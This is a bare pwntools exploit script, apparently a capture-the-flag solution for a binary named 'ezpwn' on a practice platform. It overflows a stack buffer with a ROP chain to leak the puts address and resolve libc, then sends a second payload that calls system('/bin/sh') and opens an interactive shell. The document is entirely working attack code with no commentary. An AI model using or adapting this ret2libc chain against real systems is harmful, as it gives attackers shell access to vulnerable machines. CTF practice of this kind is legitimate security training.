#coding=utf8
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

p = process('./ezpwn')
#p = remote('node3.buuoj.cn',25087)
elf = ELF('./ezpwn')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
fun1_addr = 0x0000000000400728
pop_rdi_ret = 0x0000000000400843

payload = 'a'*(0x110 - 0x4) + '\x18' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(fun1_addr)
p.sendlineafter("Hack 4 fun!",payload)

p.recv(1)
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
log.info(str(hex(puts_addr)))

libc = LibcSearcher("puts",puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")


payload = 'a'*(0x110 - 0x4) + '\x18' + p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

p.sendline(payload)

p.interactive()
